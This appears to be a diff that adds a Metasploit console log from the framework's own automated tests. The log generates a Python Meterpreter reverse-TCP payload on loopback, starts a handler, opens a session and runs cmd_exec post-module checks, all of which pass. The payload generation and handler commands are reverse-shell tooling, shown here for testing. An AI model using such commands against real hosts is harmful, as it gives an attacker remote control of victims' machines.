@@ -1,0 +1,29 @@
+use python/meterpreter_reverse_tcp
+msf6 payload(python/meterpreter_reverse_tcp) > generate -o D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220129-696-1da7n2m.py -f raw MeterpreterTryToFork=false lport=6001 lhost=127.0.0.1
+[*] Writing 115725 bytes to D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220129-696-1da7n2m.py...
+msf6 payload(python/meterpreter_reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 0
+msf6 payload(python/meterpreter_reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6001 
+[*] Meterpreter session 1 opened (127.0.0.1:6001 -> 127.0.0.1:50113 ) at 2022-01-29 22:31:48 +0000
+use test/cmd_exec
+msf6 post(test/cmd_exec) > run session=1 addentropy=true verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * missing Meterpreter features: stdapi_fs_chmod
+[*] Running against session 1
+[*] Session type is meterpreter and platform is windows
+[*] Starting cmd_exec quote tests
+[+] should return the result of echo with single quotes
+[+] should return the result of echo with double quotes
+[*] Starting cmd_exec stderr tests
+[+] should return the stderr output
+[*] Starting cmd_exec tests
+[*] meterpreter?
+[+] should return the result of echo
+[*] Session does not support sleep, skipping sleep tests
+[*] Finished cmd_exec tests
+[*] Testing complete in 0.1385024
+[*] Passed: 4; Failed: 0
+[*] Post module execution completed
+msf6 post(test/cmd_exec) > 
